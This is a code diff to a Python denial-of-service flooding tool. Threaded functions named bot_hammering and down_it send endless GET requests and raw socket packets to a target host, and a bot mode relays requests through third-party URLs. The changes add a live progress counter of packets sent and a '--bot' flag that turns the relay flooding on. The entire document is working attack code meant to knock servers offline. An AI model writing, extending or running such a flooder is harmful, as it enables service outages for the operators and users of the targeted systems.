@@ -56,13 +56,16 @@ def bot_hammering(url):
     try:
         while True:
             req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
-            print("\033[94mbot is hammering...\033[0m")
+            output = "\033[94mbot is hammering... \033[0m\r"
+            sys.stdout.write(output)
+            sys.stdout.flush()
             time.sleep(.1)
     except:
         time.sleep(.1)
 
 
 def down_it(item):
+    global i
     try:
         while True:
             packet = str("GET / HTTP/1.1\nHost: " + host +
@@ -72,15 +75,18 @@ def down_it(item):
             s.connect((host, int(port)))
             if s.sendto(packet, (host, int(port))):
                 s.shutdown(1)
-                print ("\033[92m", time.ctime(time.time()),
-                       "\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+                i += 1
+                output = "\033[92m" + time.ctime(time.time()) + "\033[0m \033[94m[" + '*'*(i%30) + (' '*(30-(i%30))) +"]\033[92m " + host + ':' + str(port) + " -> " + str(i) + "\033[0m\r"
+                sys.stdout.write(output)
+                sys.stdout.flush()
             else:
                 s.shutdown(1)
                 print("\033[91mshut<->down\033[0m")
             time.sleep(.1)
     except socket.error as e:
-        print("\033[91mno connection! server maybe down\033[0m")
-        print("\033[91m", e, "\033[0m")
+        output = "\033[91mNo connection!      \033[0m\r"
+        sys.stdout.write(output)
+        sys.stdout.flush()
         time.sleep(.1)
 
 
@@ -96,15 +102,6 @@ def dos2():
         item = w.get()
         bot_hammering(random.choice(bots) + "http://" + host)
         w.task_done()
-
-
-# reading headers
-global data
-headers = open("headers.txt", "r")
-data = headers.read()
-headers.close()
-q = Queue()
-w = Queue()
 
 
 def _cli_opts():
@@ -139,6 +136,9 @@ def _cli_opts():
                         type=int,
                         default=135,
                         help='turbo')
+    parser.add_argument('-b', '--bot',
+                        action='store_true',
+                        help='bot')
     parser.add_argument('-V', '--version',
                         action='version',
                         version='%(prog)s v' + VERSION + " by " + AUTHOR)
@@ -153,14 +153,24 @@ def _cli_opts():
 
 
 if __name__ == '__main__':
+    global data
+    global i
+    headers = open("headers.txt", "r")
+    data = headers.read()
+    headers.close()
+    q = Queue()
+    w = Queue()
+    i = 0
+
     args = _cli_opts()
 
     print("\033[92m", host, " port: ", str(port),
           " turbo: ", str(turbo), "\033[0m")
     print("\033[94mPlease wait...\033[0m")
     user_agent()
-    my_bots()
-    time.sleep(3)
+    if args.bot:
+        my_bots()
+    time.sleep(1)
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((args.server, int(args.port)))
@@ -172,9 +182,10 @@ if __name__ == '__main__':
             t = threading.Thread(target=dos)
             t.daemon = True
             t.start()
-            t2 = threading.Thread(target=dos2)
-            t2.daemon = True
-            t2.start()
+            if args.bot:
+                t2 = threading.Thread(target=dos2)
+                t2.daemon = True
+                t2.start()
         start = time.time()
         item = 0
         while True:
